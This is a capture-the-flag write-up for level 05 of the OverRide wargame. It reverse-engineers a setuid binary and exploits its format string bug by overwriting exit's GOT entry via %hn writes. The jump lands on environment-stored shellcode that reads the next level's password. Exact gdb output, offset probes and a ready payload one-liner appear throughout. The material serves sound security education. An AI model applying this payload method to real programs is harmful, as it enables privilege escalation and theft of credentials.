# Level 05

## Base analysis

```
level05@OverRide:~$ id
uid=1005(level05) gid=1005(level05) groups=1005(level05),100(users)
level05@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
level05@OverRide:~$ checksec --file ./level05
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

Setuid `level06`. The key line is **No RELRO** : the GOT (Global Offset Table) is writable. Combined with NX disabled and no PIE, this opens the door to a **format string write** that redirects a libc call into our own shellcode.

## Reverse engineering

The decompiled `main` :

```c
fgets(local_78, 100, stdin);          // read up to 100 bytes of input
local_14 = 0;
do {
    // ... length check on the buffer ...
    if (length_reached) {
        printf(local_78);             // <-- FORMAT STRING VULNERABILITY
        exit(0);
    }
    if (('@' < local_78[i]) && (local_78[i] < '[')) {   // if char is A-Z
        local_78[i] = local_78[i] ^ 0x20;               // convert to lowercase
    }
    i++;
} while (true);
```

Two behaviors matter :

1. **`printf(local_78)`** : our input is passed straight to `printf` as the *format string*. Any specifiers we include (`%x`, `%p`, `%n`...) are interpreted. Unlike Level02 where we only *read* memory, here we'll use it to *write* memory.
2. **The lowercasing loop** : every uppercase letter (`0x41`–`0x5a`, i.e. `A`–`Z`) is XORed with `0x20`, turning it into lowercase. This means we cannot place raw shellcode in the buffer — any byte that happens to fall in the `A`–`Z` range would be mangled. We'll put the shellcode in an environment variable instead.

## The plan : GOT overwrite via format string

### Why `%n`

The `%n` conversion is the one that makes writing possible. Instead of printing, `%n` **writes the number of characters printed so far** into the address supplied as its argument. Since a format string vulnerability lets us both supply the target address (by putting it in our buffer) and control how many characters get printed (with width padding like `%50d`), `%n` gives us an **arbitrary write** : any value, at any address.

### Why this even works : `printf` trusts the stack

It's worth pausing on *how* merely printing a string lets us write to memory. The trick is that `printf` has no idea how many arguments it was actually given — it blindly trusts the format string. When it hits a `%`, it fetches "the next argument" from the fixed stack location where a variadic argument *should* be, whether or not one was really passed.

Here the program calls `printf(local_78)` with a single argument (the format string itself), so there are no real variadic arguments at all. But `local_78` is our buffer, and it lives **on the stack** — right where `printf` goes looking for its arguments. So the bytes we typed get reinterpreted by `printf` as the argument values it thinks it was handed.

That's the whole mechanism : we place the GOT address (`0x080497e0`) into the first bytes of our buffer. When `printf` processes `%10$hn`, it fetches "argument 10", lands on those bytes, and reads them as a **pointer** — the address `0x080497e0`. Then `%hn` does what it always does : it writes the current character count *to the address that pointer holds*. Since that pointer is a value we chose, the write lands wherever we want. The `%d` padding isn't there to display anything useful — it only inflates the character counter to the exact value we want `%hn` to write. `printf` never distinguishes "an argument I was legitimately passed" from "bytes the attacker planted on the stack", because on the stack they occupy the same place.

### What to overwrite : `exit`'s GOT entry

Right after the vulnerable `printf`, the program calls `exit(0)`. That call is resolved through the GOT. In gdb :

```bash
gdb level05
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:  jmp    *0x80497e0
   ...
```

The `jmp *0x80497e0` means : to call `exit`, jump to the address **stored at `0x080497e0`**. So `0x080497e0` is `exit`'s GOT entry. If we overwrite the value stored there with the address of our shellcode, then when the program thinks it's calling `exit()`, it jumps into our shellcode instead.

Because RELRO is off, this GOT entry is writable — that's what makes the whole attack possible.

### The shellcode (in an env var, behind a NOP sled)

Since the lowercasing loop would corrupt shellcode placed in the buffer, we stash it in an environment variable, exactly like Level04. The shellcode itself is written in `sc.asm` (the open/read/write logic pointed at level06's password) and assembled with `nasm`. We prepend a **NOP sled** (a run of `\x90` bytes) so that we don't need to hit the shellcode's first byte exactly — any jump that lands anywhere in the sled will "slide" down the NOPs into the real code.

The `gen_shellcode.sh` script does the whole thing : assemble `sc.asm`, prepend the sled, and export the result :

```bash
nasm -f bin sc.asm -o /tmp/sc.bin          # sc.asm -> raw opcodes
export SHELLCODE=$(python -c "import sys; sys.stdout.write('\x90'*200 + open('/tmp/sc.bin','rb').read())")
```

(In practice just `. ./gen_shellcode.sh`.)

The sled matters here because the address of an environment variable on the stack depends on the length of `argv[0]` (the path used to launch the program). Our address-locating helper runs under a *different* program name than `level05`, so the two won't agree byte-for-byte. Rather than fight to align the names exactly, the sled gives us ~200 bytes of slack : we just aim somewhere in the middle of it.

We find the base address of `SHELLCODE` with a small helper (see `loce.c`). Note it is launched as `/tmp/loce` — 9 characters, the same length as `./level05` — so the environment lines up closely :

```bash
gcc -m32 loce.c -o /tmp/loce
/tmp/loce
0xffffd7e2
```

So our key values are :
- **GOT entry of `exit`** : `0x080497e0` (where we write)
- **shellcode base (start of the sled)** : `0xffffd7e2`
- **target we actually jump to** : the middle of the sled, `0xffffd7e2 + 100 = 0xffffd846`

## Finding our stack offset

`printf` reads its "arguments" off the stack. We need to know at which positional index our buffer begins, so we probe with a marker :

```bash
./level05
aaaabbbb%10$p%11$p
aaaabbbb0x616161610x62626262
```

`0x61616161` is `aaaa` and `0x62626262` is `bbbb`, so the first 8 bytes of our input are reachable at **`%10$`** and **`%11$`**. We'll place our two target addresses there.

## The hard part : writing the address in two halves

We want to write our target address `0xffffd846` (the middle of the sled) into the GOT. Two problems :

**Problem 1 — the value is huge.** `%n` writes the count of printed characters. Writing `0xffffd846` at once would require printing over 4 billion characters. Not feasible.

**Solution — write 2 bytes at a time with `%hn`.** The `h` length modifier makes the write a **short** (2 bytes). We split the address into halves and write each to consecutive addresses :
- low half `0xd846` (55366) → written at `0x080497e0`
- high half `0xffff` (65535) → written at `0x080497e2`

Together, the GOT entry reads back as `0xffffd846`. And 65535 characters is achievable.

**Problem 2 — the printed-character counter doesn't reset.** Between the first `%hn` and the second, `printf` keeps counting. When we reach the second write, the counter is already at whatever the first write left it. So we can't "start over from zero" for the second value.

**Solution — print the smaller value first.** We emit the smaller half first, then add just enough padding to reach the larger one. Here `0xd846` (55366) < `0xffff` (65535), so we write `0xd846` first.

## Computing the padding

Walking through what gets printed, in order :

- **The two addresses** at the start of the buffer are 4 bytes each = **8 characters** printed up front.
- **First write** : we want the counter to hit `55366` (`0xd846`) at the first `%hn`. Since 8 are already accounted for by the addresses, the padding is `55366 - 8 = 55358` → `%55358d`, then `%10$hn` writes `0xd846` at the GOT entry.
- **Second write** : the counter is now at `55366`; we want it at `65535` (`0xffff`). The extra padding is `65535 - 55366 = 10169` → `%10169d`, then `%11$hn` writes `0xffff` at GOT+2.

The subtle point : the `-8` correction is applied **only to the first padding**. The second padding is simply the *difference* between the two halves, so we don't subtract the 8 twice.

(These exact numbers depend on the sled base address, which shifts whenever the shellcode's size or the environment changes. The `exploit05.py` script recomputes them from whatever address the locator prints.)

## Exploitation

```bash
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55358d%10\$hn' + '%10169d%11\$hn'" | ./level05
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Or, letting the script build the payload from the located address :

```bash
python2 exploit05.py 0xffffd7e2 200 | ./level05
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Payload breakdown :

1. `'\x08\x04\x97\xe0'[::-1]` — `exit`'s GOT entry `0x080497e0`, little-endian (reachable at `%10$`).
2. `'\x08\x04\x97\xe2'[::-1]` — GOT+2 `0x080497e2`, little-endian (reachable at `%11$`).
3. `%55358d` — prints 55358 padding chars (counter reaches 55366).
4. `%10$hn` — writes `0xd846` to `0x080497e0`.
5. `%10169d` — prints 10169 more chars (counter reaches 65535).
6. `%11$hn` — writes `0xffff` to `0x080497e2`.

The GOT entry of `exit` now holds `0xffffd846`, an address inside the NOP sled. When the program reaches `exit(0)`, it jumps there, slides down the NOPs into the real shellcode, which opens `/home/users/level06/.pass`, reads it, and prints it.

Two things make this work : neither target address (`0x080497e0`, `0x080497e2`) contains a byte in the `A`–`Z` range (`0x41`–`0x5a`), so the lowercasing loop leaves them intact — and we write to the GOT entry (the operand of `jmp *` in `exit@plt`), **not** the PLT stub itself (`0x08048370`), which would just corrupt the trampoline and crash.

Level 05, clear... Progress to next level ? (Y/n) : ___
